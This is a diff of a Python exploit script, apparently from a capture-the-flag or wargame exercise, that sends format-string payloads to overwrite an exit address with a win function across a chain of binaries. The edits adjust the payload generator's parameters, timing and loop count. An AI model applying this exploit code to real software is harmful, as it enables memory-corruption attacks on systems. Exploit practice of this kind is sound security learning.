@@ -78,14 +78,16 @@ def solve_level_one(p, path_to_binary):
     #dst = exit_address
     #dpn = 23
     #buf_length = 76
-    payload = gen_fmt_string_write_exploit_x86(src=win_addr, dst=exit_address, dpn=23, buf_length=76)
+    #payload = gen_fmt_string_write_exploit_x86(src=win_addr, dst=exit_address, dpn=23, buf_length=76)
+    payload = gen_x86_fmt_string(src=win_addr, dst=exit_address, dpn=10, buf_length=18)
     payload += b"\n"
     print("payload = " + str(payload))
     print("payload class = " + str(payload.__class__))
 
     #sleep(20)
     p.send(payload)
-    sleep(0.5)
+    #p.interactive()
+    sleep(5)
     #gen_fmt_string_write_exploit_x86
     #p.interactive()
     #exit(0)
@@ -93,13 +95,14 @@ def solve_level_one(p, path_to_binary):
 
 #p = process(command, shell=True)
 i = 1
-N = 20
+N = 10
 password = initial_password
 command = initial_command
+#command = b'nc localhost 9001' #b'./binary_1_copy'
 while (i < N):
     command, password = exploit_intermediate_binary(command, password, i, solve_level_one)
     i += 1
-
+    #p.interactive()
 exploit_final_binary(command, password, N, solve_level_one)
 
 #p.interactive()
